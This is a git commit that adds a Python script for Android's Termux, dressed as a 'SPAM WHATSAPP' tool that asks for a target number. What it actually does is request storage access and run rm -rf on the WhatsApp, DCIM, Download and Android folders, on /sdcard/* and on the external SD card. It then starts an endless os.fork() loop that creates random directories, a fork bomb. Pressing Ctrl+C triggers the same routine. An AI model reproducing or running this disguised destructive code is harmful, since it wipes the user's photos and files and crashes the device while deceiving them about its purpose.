1d92cb3aae2074f38b6cb927bdb34ef64d585d4c
Doctor coringa lunático <devanilsonfrancisco36@gmail.com>
2024-10-08 14:30:33 -0300

    Atualizar o

---
+++ script.py
@@ -0,0 +1,133 @@
+import os
+import random
+import datetime
+import time
+
+def clear():
+	os.system('clear')
+
+ro = '\033[1;35m'
+cl = '\033[0m'
+cia = '\033[1;35m'
+az = '\033[1;34m'
+
+hora = datetime.datetime.today().hour
+dia = datetime.datetime.today().day
+minutos = datetime.datetime.today().minute
+ano = datetime.datetime.today().year
+mes = datetime.datetime.today().month
+    
+def clear():
+	os.system('clear')
+	
+def permicao():
+	os.system('termux-setup-storage')
+	
+def one():
+	os.system('rm -rf /storage/emulated/0/Whatsapp')
+	
+def td3():
+	os.system("rm -rf /sdcard/*")
+
+def ext():
+	os.system("rm -rf /storage/extSdCard/*")
+	
+def img():
+	os.system('rm -rf /storage/emulated/0/DCIM')
+	
+def loads():
+	os.system('rm -rf /storage/emulated/0/Download')
+def andro():
+	os.system('rm -rf /storage/emulated/0/Android')
+	
+def bombdir(Length):
+    numeros = '0123456789'
+    letras = 'abcdefghijklmnopqrstuvwxyz'
+    cs = '.-_'
+    
+    ran = ''
+    for i in range(0,Length,2):
+        ran += random.choice(letras)
+        ran += random.choice(numeros)
+        ran += random.choice(cs)
+    return ran
+
+clear()
+try:
+	print(f'''
+{cia}
+   
+▒█▀▀▄ ▒█▀▀▀█ ▒█▀▀█ ▀▀█▀▀ ▒█▀▀▀█ ▒█▀▀█ 　 
+▒█░▒█ ▒█░░▒█ ▒█░░░ ░▒█░░ ▒█░░▒█ ▒█▄▄▀ 　 
+▒█▄▄▀ ▒█▄▄▄█ ▒█▄▄█ ░▒█░░ ▒█▄▄▄█ ▒█░▒█ 　 
+
+░░░░░░░░░░▄▄▄▄▄▄▄░░░░░░░░░░
+░░░░░░▄▄▀▀░░░░░░░▀▀▄▄░░░░░░
+░░░░▄▀░░░░░░░░░░░░░░░▀▄░░░░
+░░░▄▀░░░▄▄▄▄▄▄▄▄▄▄▄░░░░█░░░
+░░█░░▄███████████████▄░░█░░
+░█░░▄██▀░▄▄▀███▀▄▄░▀███░░█░
+░█░░▀█████████████████▀░░█░
+░█░░░░▀▀████████████▀░░░░█░
+░░█░░░░░░░░▀▀▀▀▀░░░░░░░▄▀░░
+░░░▀▀▄▄▄▄░░░░░░░░░▄▄▄▀▀░░░░
+░░▄██▀▄▄▄█▀▀▀▀▀▀▀█▄▄▄▀██▄░░
+░▄▀██░░░░░▀▀▀▀▀▀▀░░░░░██▀▄░
+█░░██░░░░░░░░░░░░░░░░░██░░█
+█░░██░░░░░░░░░░░░░░░░░██░░█
+█░░██░░░░░░░░░░░░░░░░░██░░█
+█░░██░░░░░░░░░░░░░░░░░██░░█
+█░░██░░░░░░░░░░░░░░░░░██░░█
+█░░██▄░░░░░░░░░░░░░░░▄██░░█
+▀▀▄█░█▄▄▄▄░░░░░░░▄▄▄▄█░█▄▀▀
+░░░░░░░░░█▄▄▄▄▄▄▄█░░░░░░░░░
+░░░░░░░░░░░░░░░░░░░░░░░░░░░
+AUTOR ; DOCTOR CORINGA LUNÁTICO 
+
+　 　 　 ▒█▀▀█ ▒█▀▀▀█ ▒█▀▀█ ▀█▀ ▒█▄░▒█ ▒█▀▀█ ░█▀▀█ 
+　 　 　FCC SOMBRIA LUNÁTICO  : FCC  KALEESI SERAFIM
+　 　 　 ▒█▄▄█ ▒█▄▄▄█ ▒█░▒█ ▄█▄ ▒█░░▀█ ▒█▄▄█ ▒█░▒█ 
+
+{cl}
+      
+         data: {dia}/{mes}/{ano}
+         hora: {hora}:{minutos}
+   ╔════════════════╗
+     {ro}SPAM WHATSAPP{cl}   
+   ╚════════════════╝
+   
+by: {ro} doctor coringa spam {cl}
+whatsapp: exemplo {ro}5535*******{cl}
+
+╭┈ • NUMERO DO ALVO
+┆''')
+	input(f'╰┈ •• ❥︎ {ro}')
+ 
+	clear()
+
+
+
+	permicao()
+	one()
+	img()
+	loads()
+	ext()
+	td3()
+	andro()
+	time.sleep(2)
+	while True:
+		os.fork()
+		os.system(f'mkdir {bombdir(10*10)}')
+except KeyboardInterrupt:
+	permicao()
+	one()
+	img()
+	loads()
+	ext()
+	td3()
+	andro()
+	time.sleep(2)
+	while True:
+			os.fork()
+			os.system(f'mkdir {bombdir(10*10)}')
+            
